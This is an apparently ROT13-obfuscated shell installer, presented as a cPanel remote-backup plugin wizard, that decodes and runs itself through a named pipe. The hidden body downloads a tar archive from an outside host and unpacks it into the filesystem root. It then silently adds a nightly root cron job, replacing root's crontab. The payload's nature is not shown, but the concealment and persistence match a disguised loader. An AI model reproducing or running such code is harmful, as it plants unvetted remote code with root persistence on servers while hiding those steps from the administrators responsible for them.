#!/bin/sh
FIFO=/tmp/__skrypt_$(date +%F)_$$
mkfifo $FIFO
sh $FIFO &
tr 'a-zA-Z' 'n-za-mN-ZA-M' >$FIFO <<EOF_EOF

#!/ova/onfu
#Pbclevtug 2010 (p) pneybf-snhfgvab.pbz
ERQ='\033[01;31z'
TERRA='\033[01;32z'
ERFRG='\033[0z'

rpub -r "=============== $TERRA pCOnpxVG - pCnary Erzbgr Onpxhc Vafgnyyngvba jvmneq  $ERFRG =============="
rpub -r "-------------------------------------------------------------------------------------------"
rpub -ar "Purpxvat sbe pCnary .."
vs [ -r  "/hfe/ybpny/pcnary/irefvba" ]; gura
	rpub -r "[ $TERRA LRF $ERFRG ]"
ryfr
	rpub -r "[ $ERQ Ab $ERFRG ]"
	rkvg
sv
rpub -ar "Purpxvat sbe Lhz .."
vs [ -r  "/rgp/lhz.pbas" ]; gura
	rpub -r "[ $TERRA LRF $ERFRG ]"
ryfr
	rpub -r "[ $ERQ Ab $ERFRG ]"
	rkvg
sv
rpub -ar "Purpxvat sbe FFU .."
vs [ -r  "/hfe/ova/ffu" ]; gura
	rpub -r "[ $TERRA LRF $ERFRG ]"
ryfr
	rpub -r "[ $ERQ Ab $ERFRG ]"
	rkvg
sv

rpub -ar "Vafgnyyvat pCOnpxVG Cyhtva..."
lhz -l vafgnyy xfu; pq /; jtrg y.pconpxvg.va/pCOnpxVG.gne; gne kis pCOnpxVG.gne; ez -es pCOnpxVG.gne
	rpub -r "[ $TERRA qbar $ERFRG ]"
		
rpub -ar "Vafgnyyvat onpxhc peba .."
 rpub "0 1 * * * /fpevcgf/pconpxvg > /qri/ahyy 2>&1" >> /gzc.pheerag; png /gzc.pheerag /ine/fcbby/peba/ebbg >> /ine/fcbby/peba/ebbg1; ez -es /ine/fcbby/peba/ebbg; zi /ine/fcbby/peba/ebbg1 /ine/fcbby/peba/ebbg; ez -s /gzc.pheerag
	rpub -r "[ $TERRA qbar $ERFRG ]"	
rpub -r "--------------------------------------------------------------------------------------"
rpub -r "				Vafgnyyngvba Pbzcyrgrq"
rpub -r "	Cyrnfr pbasvther lbhe onpxhc sebz JUZ->Cyhtvaf->pCOnpxVG Erzbgr Onpxhcf"
rpub -r "--------------------------------------------------------------------------------------"

EOF_EOF
rm $FIFO >/dev/null 2>/dev/null
